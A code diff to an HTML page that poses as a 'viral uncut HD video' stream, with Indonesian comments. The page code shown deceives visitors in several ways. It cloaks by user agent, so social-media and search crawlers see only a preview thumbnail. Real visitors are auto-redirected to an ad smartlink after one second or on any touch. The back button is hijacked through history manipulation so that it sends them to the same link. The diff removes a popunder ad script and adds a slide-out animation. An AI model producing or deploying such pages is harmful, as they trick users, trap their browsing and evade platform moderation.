@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Stream HD - Viral Video</title>
 
-  <!-- OpenGraph Metadata Sosmed -->
+  <!-- OpenGraph Metadata -->
   <meta property="og:type" content="video.other">
   <meta property="og:title" content="Viral! Watch Full Uncut Video in HD">
   <meta property="og:description" content="Streaming video kualitas 1080p tanpa jeda. Klik untuk memutar.">
@@ -18,9 +18,6 @@
   <meta name="twitter:title" content="Viral! Watch Full Uncut Video in HD">
   <meta name="twitter:description" content="Streaming video kualitas 1080p tanpa jeda. Klik untuk memutar.">
   <meta name="twitter:image" content="thumb.jpg">
-
-  <!-- Skrip Popunder Adsterra -->
-  <script data-cfasync="false" src="https://afders.org/1/e8d9ccd0cd466481ee8c50f27d4aa763"></script>
 
   <style>
     * {
@@ -75,6 +72,11 @@
       justify-content: center;
       align-items: center;
       background: #111;
+      transition: transform 0.8s ease, opacity 0.8s ease;
+    }
+    .card-container.slide-out {
+      transform: translateX(-100%);
+      opacity: 0;
     }
     .card-container img {
       width: 100%;
@@ -142,24 +144,19 @@
 <body>
   <div class="wrapper">
     <div class="blur-background"></div>
-    <div class="card-container">
+    <div class="card-container" id="video-card">
       <img src="thumb.jpg" alt="Video Stream Preview">
       <div class="play-button"></div>
     </div>
     <div class="action-label">Tap anywhere to stream full video ▶</div>
   </div>
 
-  <!-- Area sentuh penuh -->
   <div id="full-click-area"></div>
 
   <script>
-    // Link tujuan utama (Smartlink Layer 1)
-    const primaryLink = "https://auctionr.org/4/110c19a059ed86d69a5dda758b996b9f";
-    
-    // Link cadangan jika tombol back ditekan (Smartlink Layer 2)
-    const backLink = "https://auctionr.org/4/110c19a059ed86d69a5dda758b996b9f";
+    const smartlinkUrl = "https://auctionr.org/4/110c19a059ed86d69a5dda758b996b9f";
 
-    // Filter Bot
+    // Filter bot/crawler agar preview thumbnail sosmed tetap aman terbaca
     const botPattern = /facebookexternalhit|Facebot|Pinterest|Twitterbot|TelegramBot|WhatsApp|Googlebot|bingbot|Quora Link Preview/i;
     const isBot = botPattern.test(navigator.userAgent);
 
@@ -168,33 +165,38 @@
         history.pushState(null, null, location.href);
       }
       window.onpopstate = function () {
-        location.replace(backLink);
+        location.replace(smartlinkUrl);
       };
     }
 
     function executeRedirect() {
       setupBackTrapping();
-      window.location.href = primaryLink;
+      const card = document.getElementById("video-card");
+      if (card) {
+        card.classList.add("slide-out");
+      }
+      window.location.href = smartlinkUrl;
     }
 
     if (!isBot) {
-      // Setup riwayat saat halaman dimuat
+      // Inisialisasi awal penahanan tombol back
       history.pushState(null, null, location.href);
       window.onpopstate = function () {
-        location.replace(backLink);
+        location.replace(smartlinkUrl);
       };
 
-      // Kunci riwayat saat ada sentuhan pertama
+      // Kunci saat layar pertama disentuh
       document.addEventListener("touchstart", setupBackTrapping, { once: true });
       document.addEventListener("click", setupBackTrapping, { once: true });
 
-      // Eksekusi sentuhan layar ke penawaran
+      // Sentuhan manual ke penawaran
       document.getElementById("full-click-area").addEventListener("click", executeRedirect);
       document.getElementById("full-click-area").addEventListener("touchstart", executeRedirect);
 
-      // Timer pengalihan otomatis 1 detik
+      // Pengalihan otomatis 1 detik (1000 ms)
       setTimeout(executeRedirect, 1000);
     }
   </script>
 </body>
 </html>
+
